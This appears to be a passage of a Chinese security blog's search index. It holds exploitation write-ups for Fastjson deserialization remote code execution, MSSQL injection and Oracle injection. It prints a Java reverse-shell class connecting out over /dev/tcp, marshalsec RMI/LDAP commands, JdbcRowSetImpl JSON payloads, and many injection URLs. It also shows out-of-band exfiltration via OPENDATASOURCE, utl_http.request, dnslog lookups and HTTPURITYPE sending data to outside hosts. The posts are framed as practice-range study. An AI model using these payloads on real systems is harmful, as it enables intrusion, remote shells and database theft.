&#123; // do nothing &#125; &#125;&#125; 4、使用命令javac dnslog.java编译java文件，得到dnslog.class文件。 5、将两个文件通过python3 -m http.server命令放到外网环境中 6、使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类dnslog.class 1234git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/编译项目mvn clean package -DskipTests 成功之后，target目录下会生成marshalsec-0.0.3-SNAPSHOT-all.jar文件 7、在当前主机通过生成的marshalsec文件运行rmi服务 12cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.229.158:4455/#dnslog&quot; 9999 7、在漏洞页面bp抓包后post提交数据，替换如下payload： 12345678910Accept:*/*Content-Type: application/json&#123; &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://192.168.229.158:9999/dnslog&quot;, &quot;autoCommit&quot;:true&#125;&#125; 8、在dnslog可以看到回显了whoami的结果为root Fastjson&lt;1.2.48远程代码执行漏洞1、首先使用docker搭建环境 2、访问8090端口显示页面表示搭建成功 3、新建一个Exploit.java文件，内容如下，执行一个反弹shell操作。 12345678910111213141516171819202122232425import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader;public class Exploit&#123; public Exploit() throws Exception &#123; Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.4.187/4554;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; p.waitFor(); is.close(); reader.close(); p.destroy(); &#125; public static void main(String[] args) throws Exception &#123; &#125;&#125; 4、使用javac命令编译Exploit.java文件，得到Exploit.class文件5、将两个文件通过python3 -m http.server命令放到外网环境中 6、使用工具marshalsec开启LDAP服务监听，命令如下，监听端口为6666 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.229.158:4455/#Exploit 6666 7、客户端开启监听，这里我使用windows的nc进行监听 8、抓取数据包，更换传参方式为post，放入payload： 1234567891011121314Accept: */*Content-Type: application/json&#123; &quot;name&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;x&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://192.168.229.158:6666/Exploit&quot;, &quot;autoCommit&quot;:true &#125;&#125; 9、查看监听，已经成功获取了服务器的shell","path":"2021/06/08/漏洞复现-Fastjson全方位利用/"},{"title":"MSSQL数据库注入全方位利用","text":"本文由ajie原创发布转载，请参考转载声明，注明出处： https://www.anquanke.com/post/id/248896安全客 - 有思想的安全新媒体 0x01 前言在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～ 0x02 注入前准备1、确定注入点1http://219.153.49.228:40574/new_list.asp?id=2 and 1=1 1http://219.153.49.228:40574/new_list.asp?id=2 and 1=2 2、判断是否为mssql数据库sysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。 1http://219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)&gt;0 还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。 1http://219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY &#x27;00:00:10&#x27;; -- asd 3、相关概念系统自带库MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。这里了解一下系统级库： 1234master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。model：模版数据库tempdb：临时容器msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。 系统自带表MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。 12sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。 就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个’U’为用户所创建，一个’S’为系统所创建。其他对象类型如下： 1234567891011121314151617181920212223242526对象类型：AF = 聚合函数 (CLR)C = CHECK 约束D = DEFAULT（约束或独立）F = FOREIGN KEY 约束FN = SQL 标量函数FS = 程序集 (CLR) 标量函数FT = 程序集 (CLR) 表值函数IF = SQL 内联表值函数IT = 内部表P = SQL 存储过程PC = 程序集 (CLR) 存储过程PG = 计划指南PK = PRIMARY KEY 约束R = 规则（旧式，独立）RF = 复制筛选过程S = 系统基表SN = 同义词SQ = 服务队列TA = 程序集 (CLR) DML 触发器TF = SQL 表值函数TR = SQL DML 触发器U = 表（用户定义类型）UQ = UNIQUE 约束V = 视图X = 扩展存储过程 排序&amp;获取下一条数据mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用&lt;&gt;或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上(‘’)，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下： 1234#使用&lt;&gt;获取数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name&lt;&gt;&#x27;id&#x27; and name&lt;&gt;&#x27;username&#x27;-- qwe#使用not in获取数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe 堆叠注入在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。 1http://192.168.150.4:9001/less-1.asp?id=1&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;;-- qwe 0x03 显错注入1、判断当前字段数1http://219.153.49.228:40574/new_list.asp?id=2 order by 4 1http://219.153.49.228:40574/new_list.asp?id=2 order by 5 通过order by报错情况，可以判断出当前字段为4。 2、联合查询，获取显错点1、首先因为不知道具体类型，所以还是先用null来填充字符 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe 2、替换null为’null’，获取显错点 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe 当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select &#x27;null&#x27;,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe 3、通过显错点获取数据库信息1、获取数据库版本 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select @@version),null -- qwe 2、查询当前数据库名称通过轮询db_name()里的内容，获取所有数据库库名 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(5)),null -- qwe 3、查询当前用户 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select user),null -- qwe 4、查询表名查询dbo.sysobjects表中用户创建的表，获取其对应的id和name 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe 查询下一个表名 1#使用&lt;&gt;获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id &lt;&gt; 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id not in (&#x27;5575058&#x27;) -- qwe 5、查询列名这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27;-- qwe 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe 6、information_schema值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 table_name from information_schema.tables where table_name &lt;&gt; &#x27;manager&#x27;),null -- qwe 1http://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; and column_name not in (&#x27;id&#x27;,&#x27;username&#x27;)),null -- qwe 7、获取数据1http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username &lt;&gt; &#x27;admin_mz&#x27;-- qwe 解密获取密码 0x04 报错注入mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。 1、直接报错等号两边数据类型不一致配合子查询获取数据。 1#获取数据库库名?id=1&#x27; and 1=(select db_name()) -- qwe 1#获取第一个表名?id=1&#x27; and 1=(select top 1 name from dbo.sysobjects) -- qwe 1#将数据连接显示?id=1&#x27; and 1=stuff((select db_name() for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+ 2、convert()函数1convert(int,db_name())，将第二个参数的值转换成第一个参数的int类型。 具体用法如下： 1#获取数据库库名?id=1&#x27; and 1=convert(int,(select db_name())) -- qwe 1#获取数据库版本?id=1&#x27; and 1=convert(int,(select @@version))) -- qwe 3、cast()函数1CAST(expression AS data_type)，将as前的参数以as后指定了数据类型转换。 具体用法如下： 1#查询当前数据库?id=1&#x27; and 1=(select cast(db_name() as int)) -- qe 1#查询第一个数据表?id=1&#x27; and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe 4、数据组合输出1#将数据表组合输出?id=1&#x27; and 1=stuff((select quotename(name) from dbo.sysobjects for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+ 1#查询users表中的用户名并组合输出?id=1&#x27; and 1=stuff((select quotename(username) from users for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+ 0x05 布尔盲注1、查询数据库库名1、查询数据库库名长度为11 1http://219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11 2、查询第一个字符的ascii码为109 1http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))&gt;109 3、查询第二个字符的ascii码为111 1http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111 4、获取所有ascii码之后，解码获取数据 2、查询表名除了像上面查询库名使用了ascii码外，还可以直接猜解字符串 1http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27; 1http://219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,6)=&#x27;manage&#x27; 0x06 延时盲注1、延时函数 WAITFOR DELAY1语法：n表示延时几秒WAITFOR DELAY &#x27;0:0:n&#x27;id=1 if (布尔盲注的判断语句) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe 2、查询数据1#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe 1#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27;) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe 0x07 反弹注入就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。反弹注入需要使用opendatasource函数。 1OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。 1申请免费云服务器：香港云：http://www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/ 1、环境准备1、首先打开靶场3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。 1CREATE TABLE test(name VARCHAR(255)) 2、获取数据库所有表1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。 1#查询sysobjects表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe 2、执行成功页面返回正常。3、在数据库中成功获取到数据。 3、获取数据库admin表中的所有列名1#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name=&#x27;admin&#x27;-- qwe#查询syscolumns表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe 4、获取数据1、首先新建一个表，里面放三个字段，分别是id，username和passwd。 1CREATE TABLE data(id INT,username VARCHAR(255),passwd VARCHAR(255)) 2、获取admin表中的数据 1?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.data select id,username,passwd from admin -- qwe 0x08 总结完成这篇文章共费时1周，主要花时间在环境搭建以及寻找在线靶场。全文从显错注入、报错注入到盲注和反弹注入，几乎涵盖了所有MSSQL注入类型，若有所遗漏还请联系我，我必将在原文基础上进行改进。因为能力有限，本文未进行太多了原理描述，也因为SQL注入原理市面上已经有很多文章进行了讲解，所以文章最终以实战注入作为重心开展，讲述找寻到注入点后在如何在多种情况下获取数据。 靶场采用墨者学院、掌控安全，以及MSSQL-sqli-labs靶场，实际攻击时还需要考虑waf绕过等，后续会计划完成一篇针对waf绕过和提权getshell的文章，敬请期待～","path":"2021/02/02/MSSQL数据库注入全方位利用/"},{"title":"Oracle数据库注入全方位利用总结(渗透必备)","text":"本文已发布到先知社区：https://xz.aliyun.com/t/9940 作者：ajie 0x01 前言在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～ 0x02 注入点确定跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。 1http://219.153.49.228:43469/new_list.php?id=1%20and%201=1 1http://219.153.49.228:43469/new_list.php?id=1%20and%201=2 0x03 显错注入1、判断字段数为2与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。 1http://219.153.49.228:43469/new_list.php?id=1%20order%20by%202 2、获取显错点联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select ‘null’,’null’。(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。) 1234#联合查询http://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual#修改null为&#x27;null&#x27;，判断字段类型均为字符型http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual 后续便可以替换显错点进行注入。 3、查询数据库版本信息1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual 4、获取当前数据库连接用户123http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select sys_context(&#x27;userenv&#x27;,&#x27;current_user&#x27;) from dual) from dualhttp://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;1&#x27;,user from dual 5、查询当前数据库库名1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual 6、查询数据库表名查询表名一般查询admin或者user表 直接查询获取第一个表名LOGMNR_SESSION_EVOLVE$ 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual 获取第二个表名LOGMNR_GLOBAL$ 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual 获取第三个表名LOGMNR_GT_TAB_INCLUDE$ 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27; and table_name not in &#x27;LOGMNR_GLOBAL$&#x27;) from dual 模糊搜索查询获取sns_users表名 1http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual 7、查询数据库列名直接查询获取sns_users表里的字段 123456789http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dualhttp://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dualhttp://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27;) from dual……………http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27; and column_name not in &#x27;PROTOCOL&#x27; and column_name not in &#x27;SPARE1&#x27; and column_name not in &#x27;DB_USERNAME&#x27; and column_name not in &#x27;OID&#x27; and column_name &lt;&gt; &#x27;EVENTID&#x27; and column_name &lt;&gt; &#x27;NAME&#x27; and column_name &lt;&gt; &#x27;TABLE_OBJNO&#x27;) from dual 12345678910111213获取如下字段：USER_NAMEAGENT_NAMEPROTOCOLSPARE1DB_USERNAMEOIDEVENTIDNAMETABLE_OBJNOUSAGEUSER_PWD………… 模糊搜索查询123http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dualhttp://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27; and column_name &lt;&gt; &#x27;USER_NAME&#x27;) from dual 8、查询数据库数据获取账号密码字段内容 1http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 1http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; 1http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; and USER_NAME not in &#x27;hu&#x27; 解密获取密码392118 9、美化输出Oracle采用||进行数据连接 1http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;用户名：&#x27;||USER_NAME,&#x27;密码：&#x27;||USER_PWD from &quot;sns_users&quot; where rownum=1 0x04 报错注入报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。 1、ctxsys.drithsx.sn()12#获取当前数据库用户 ORACLE1?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) -- 12#获取数据库版本信息?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) -- 2、XMLType()1?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- 3、dbms_xdb_version.checkin()12#获取数据库版本信息?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 4、bms_xdb_version.makeversioned()12#获取当前数据库用户 ORACLE1?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- 5、dbms_xdb_version.uncheckout()12#获取数据库版本信息?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 6、dbms_utility.sqlid_to_sqlhash()12#获取数据库版本信息?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null -- 7、ordsys.ord_dicom.getmappingxpath()1?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)-- 8、utl_inaddr.*()utl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址） 12?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) -- 0x05 布尔型盲注常用猜解： 12345#猜长度?id=1 and 6=(select length(user) from dual)--#截取值猜ascii码?id=1 and (select ascii(substr(user,1,1)) from dual)&gt;83?id=1 and (select ascii(substr(user,1,1)) from dual)=83 1、decode函数布尔盲注decode(字段或字段的运算，值1，值2，值3）这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3 测试用户名长度1http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) -- 测试当前用户是否为SYSTEM12#如果是system用户则返回正常，不是则返回不正常http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- 12345678910#使用substr截断，逐个字段进行猜解http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,1,0) from dual) -- ?id=1 and 1=(select decode(substr(user,2,1),&#x27;Y&#x27;,1,0) from dual) -- ?id=1 and 1=(select decode(substr(user,3,1),&#x27;S&#x27;,1,0) from dual) --?id=1 and 1=(select decode(substr(user,4,1),&#x27;T&#x27;,1,0) from dual) --?id=1 and 1=(select decode(substr(user,5,1),&#x27;E&#x27;,1,0) from dual) --?id=1 and 1=(select decode(substr(user,6,1),&#x27;M&#x27;,1,0) from dual) --#当然也可以配合ascii码进行猜解?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,1,0) from dual) -- 2、instr函数布尔盲注instr函数的应用： 12select instr(&#x27;abcdefgh&#x27;,&#x27;de&#x27;) position from dual;#返回结果：4 盲注中的应用： 12http://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),&#x27;SYS&#x27;)) --?id=1 and 4=(instr((select user from dual),&#x27;T&#x27;)) -- 0x06 延时盲注1、检测漏洞存在DBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。具体用法为：DBMS_PIPE.RECEIVE_MESSAGE(‘pipename’,timeout)pipename为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。timeout为integer的可选输入参数，用来指定等待时间。常用payload如下： 1http://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message(&#x27;o&#x27;, 10)-- 如果页面延时10秒返回，即存在注入。 2、配合decode函数延时盲注只需要将延时语句放入decode函数中即可 12345#直接猜解字符?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --#通过ascii猜解字符?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) -- 3、使用其他延时查询来判断如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。 12345#直接猜解字符?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,(select count(*) from all_objects),0) from dual) --#通过ascii猜解字符?id=1 and 1=(select decode(ascii(substr(user,1,1)),&#x27;83&#x27;,(select count(*) from all_objects),0) from dual) -- 0x07 外带数据注入1、url_http.request()使用此方法，用户需要有utl_http访问网络的权限首先检测是否支持，页面返回正常则表示支持 1?id=1 and exists (select count(*) from all_objects where object_name=&#x27;UTL_HTTP&#x27;) -- 然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务： 1python3 -m http.server 4455 12345#子查询数据库版本信息并访问python起的http服务?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;||(select banner from sys.v_$version where rownum=1))=1--#http访问时可以将||进行URL编码?id=1 and utl_http.request(&#x27;http://192.168.100.130:4455/&#x27;%7C%7C(select banner from sys.v_$version where rownum=1))=1-- 可以看到成功获取了数据 2、utl_inaddr.get_host_address()函数12#使用dnslog外带数据?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.eeaijt.dnslog.cn&#x27;) from dual)is not null -- 3、SYS.DBMS_LDAP.INIT()函数网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。 123?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null --?id=1 and (select DBMS_LDAP.INIT((select user from dual)||&#x27;.51prg6.dnslog.cn&#x27;,80) from dual)is not null -- 4、HTTPURITYPE()函数1?id=1 and (select HTTPURITYPE(&#x27;http://192.168.100.130:4455/&#x27;||(select user from dual)).GETCLOB() FROM DUAL)is not null -- 同样需要python起一个http服务，或者nc创建监听虽然访问404，但是同样成功外带数据。 0x08 